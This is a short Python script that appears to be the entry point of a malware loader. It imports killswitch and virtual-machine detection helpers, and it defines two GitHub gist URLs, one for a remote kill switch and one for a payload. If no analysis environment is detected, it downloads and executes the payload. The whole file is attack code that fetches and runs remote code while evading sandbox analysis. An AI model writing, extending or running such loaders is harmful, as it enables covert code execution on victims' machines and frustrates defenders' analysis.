import base64
import sys

import requests
import requests.exceptions

from killswitch import killswitch
from checkVM import checkVMserver, checkCPU, checkVMprocess
from executePayload import executePayload


# PARAMETROS
killswitch_URL = "https://gist.githubusercontent.com/apachete24/7202e9ccfa8b5008a12ce38563766081/raw/5f8b4866e06d149222552e3524761601c887d767/control"
payload_URL = "https://gist.githubusercontent.com/apachete24/70b0c75e9870905b17342f80700e3c19/raw/dc7a856fb7f24cd7331c2f4916259e4f1dabf2e9/foroSuperseguro.html"



if killswitch(killswitch_URL) or checkCPU() or checkVMprocess() or checkVMserver():
    sys.exit(0)


executePayload(payload_URL)

